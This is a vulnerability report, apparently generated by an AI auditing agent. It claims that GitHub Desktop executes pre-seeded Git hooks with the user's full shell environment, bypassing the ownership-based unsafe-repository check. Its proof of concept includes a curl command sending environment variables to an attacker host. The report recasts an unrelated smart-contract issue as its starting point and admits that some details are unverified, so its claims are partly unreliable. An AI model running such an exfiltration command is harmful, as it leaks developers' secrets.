### Title
Attacker-controlled repository directory executes Git hooks with full interactive shell environment before Desktop's "unsafe repository" ownership check ever applies - (File: `app/src/lib/hooks/with-hooks-env.ts`)

### Summary
The reported issue is fundamentally about an upgradeable-proxy admin being able to unilaterally change contract logic and silently drain user-approved funds, with the ordinary allowance/collateral-accounting invariant offering no protection because the "admin" primitive sits outside of it. The closest analog in this GitHub Desktop checkout is the newly enabled **hooks environment** feature: Desktop will silently locate and execute *pre-existing* executable Git hook scripts found in a repository directory, running them with the user's **full interactive shell environment** (sourced from `.bashrc`/`.zshrc`/profile) rather than Desktop's normal minimal spawn environment, via `withHooksEnv` [1](#0-0)  and `createHooksProxy` [2](#0-1) . The only trust gate Desktop has for "this directory might be dangerous" is the Git `safe.directory` **ownership** check surfaced in `add-existing-repository.tsx`/`missing-repository.tsx` [3](#0-2) , which does not fire when the current user already owns the directory (e.g. after extracting a downloaded archive/template that ships a pre-populated `.git/hooks` folder with executable scripts). In that case there is no invariant left that stops hook execution.

### Finding Description
`enableHooksEnvironment()` is unconditionally `true` and `enableHooksByDefault` gates only the *default* toggle state (still user-overridable, and is `true` for beta/dev channels) [4](#0-3) . When enabled, every Git operation performed by Desktop that passes `interceptHooks` (commit, push, pull, merge — see `app/src/lib/git/commit.ts`, `pull.ts`, `push.ts`, `merge.ts`) goes through `withHooksEnv`, which:

1. Calls `getRepoHooks(path, opts.interceptHooks)` to enumerate **already-present, executable** hook files under the repository's `core.hooksPath`/`.git/hooks` [5](#0-4) .
2. If any exist, spins up a local TCP proxy and copies a `process-proxy` shim in their place so that when Git invokes a hook, `createHooksProxy` intercepts it and re-spawns the real hook binary using `git hook run <hookName>` [6](#0-5) .
3. Crucially, the hook subprocess is spawned with `shellEnv.env` obtained via `getShellEnv(cwd)`, i.e. the user's **full login/interactive shell environment** (PATH, shell profile-exported variables, tokens exported in `.bashrc`/`.zshrc`, etc.), merged only with a small allow-listed `safeEnv` (`GIT_`/`GITHEAD_` prefixes) [7](#0-6) [2](#0-1) .

Nothing in this path checks whether the repository was cloned by the user via Desktop/Git (where `.git/hooks` would only contain non-executable `.sample` files) versus obtained as a pre-built directory tree from an untrusted source (zip download, tarball, "starter template", synced folder, etc.) that already ships executable hook scripts inside `.git/hooks`. The only Desktop-side control that exists for "this directory might not be trustworthy" is the Git ownership-based unsafe-repository warning surfaced in the UI [8](#0-7)  and `add-existing-repository.tsx` [9](#0-8) , which is based purely on filesystem **owner UID mismatch**, not on the origin/history of the directory content. Because extracting an archive or copying a folder makes the current user the owner, this guard never engages, so a maliciously pre-seeded `.git/hooks/pre-commit` (or `post-checkout`, `pre-push`, `post-merge`, etc., all of which are now intercepted per the changelog entries for hooks support [10](#0-9) ) will run automatically the first time the user commits/pushes/pulls/merges in that repository from Desktop.

### Impact Explanation
Once the malicious hook runs, it executes with the user's full shell environment (not merely `GIT_`-prefixed variables), which on typical developer machines includes exported API tokens, cloud CLI credentials, and other secrets loaded from shell rc files, in addition to unrestricted code-execution capability on the host. This directly satisfies the "code execution" and "credential/token exfiltration" impact classes named in the task's valid-impact list, triggered purely by an attacker-controlled directory that ends up on disk and is then added/used as a repository in Desktop — no privileged/local/physical access or pre-existing malware is required beyond the attacker shipping the booby-trapped directory (e.g. as a template/example project or "project export").

### Likelihood Explanation
Medium. It requires the victim to obtain the malicious repository content as a raw directory (not via `git clone`, since a normal clone never populates `.git/hooks` with executable files) — e.g., downloading a "sample project" zip/tarball that bundles a `.git` folder, or copying a project folder from a shared drive/CI artifact — and then adding it to Desktop and performing any of the intercepted operations (commit/push/pull/merge). This is a plausible and increasingly common distribution vector for template repositories and example projects, and requires no unusual or "unnatural" steps beyond the normal "Add existing repository" → commit flow that Desktop encourages. `enableHooksByDefault` currently defaults to on for beta/dev channel users and is user-togglable in preferences for everyone else, so exposure is not universal but is real and growing (per the changelog history moving this feature from beta to default-enabled).

### Recommendation
- Extend the existing "potentially unsafe repository" detection beyond ownership mismatches to also flag repositories whose `.git/hooks` (or configured `core.hooksPath`) already contains executable files at the time they are first added/opened in Desktop, independent of directory ownership.
- Require explicit, hook-specific user confirmation (naming the hook file(s) found) the first time Desktop is about to execute a hook it did not itself install, rather than silently proxying it.
- Reconsider whether `getShellEnv`'s full interactive shell environment should be passed to hook processes by default; consider stripping known-sensitive variables (tokens, cloud credentials) in addition to the current `excludedEnvVars`/`safeEnv` allow-list, or making full-shell-env hook execution strictly opt-in per repository.

### Proof of Concept
1. Attacker creates a project archive containing a `.git` directory with an executable `.git/hooks/post-checkout` (or `pre-commit`) script that exfiltrates environment variables (e.g. `curl attacker.com -d "$(env)"`) and distributes it as a "starter template" zip/tarball.
2. Victim downloads and extracts the archive to a local folder they own, then uses GitHub Desktop's "Add existing repository" flow to add it — because the victim owns the extracted directory, the unsafe-repository ownership warning in `missing-repository.tsx`/`add-existing-repository.tsx` never appears.
3. Victim makes a commit (or performs a checkout/pull/merge) inside Desktop with the hooks-environment feature enabled (default in beta/dev channels, or previously opted in).
4. `withHooksEnv` detects the pre-existing executable hook via `getRepoHooks`, installs the `process-proxy` shim, and `createHooksProxy` spawns the real hook using the victim's full interactive shell environment obtained from `getShellEnv`, silently exfiltrating secrets/executing arbitrary code — with no dialog or warning shown to the user.

Note: I was not able to fully trace every call site that sets `opts.interceptHooks = true` (e.g. the exact list of operations in `commit.ts`, `pull.ts`, `push.ts`, `merge.ts`) within the available search budget, nor confirm the exact default state of `enableHooksByDefault` across all release channels beyond what's visible in `feature-flag.ts`. If precise verification of these call sites or the exact hooks-eligibility surface is required, a full Devin session with direct file access would allow confirming these details end-to-end.

export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }

  const hooks = await Array.fromAsync(getRepoHooks(path, opts.interceptHooks))

  if (hooks.length === 0) {
    return fn(opts?.env)
  }
